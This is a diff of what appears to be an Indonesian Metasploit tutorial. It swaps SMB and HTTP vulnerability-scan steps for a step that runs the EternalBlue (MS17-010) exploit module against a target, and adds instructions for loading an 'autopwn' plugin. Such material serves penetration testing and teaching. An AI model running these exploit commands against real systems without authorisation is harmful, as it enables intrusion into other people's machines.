@@ -398,20 +398,17 @@ use auxiliary/scanner/smb/smb_ms17_010
 set RHOSTS TARGET_IP
 run
 
-# Scan EternalBlue (MS17-010)
-use auxiliary/scanner/smb/smb_ms17_010
-set RHOSTS 192.168.1.0/24
-run
-
-# Scan MS08-067
-use exploit/windows/smb/ms08_067_netapi
-set RHOSTS TARGET_IP
-check    # cek tanpa exploit
-
-# HTTP vulnerability
-use auxiliary/scanner/http/apache_mod_cgi_bash_env
+# Exploit EternalBlue (MS17-010)
+use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS TARGET_IP
 run
+
+# Plugin Metasploit Autopwn
+https://github.com/hahwul/metasploit-autopwn
+
+move: /usr/share/metasploit-framework/plugins/
+load: load db_autopwn
+
 ```
 
 ### Integrasi dengan Nmap & Nessus
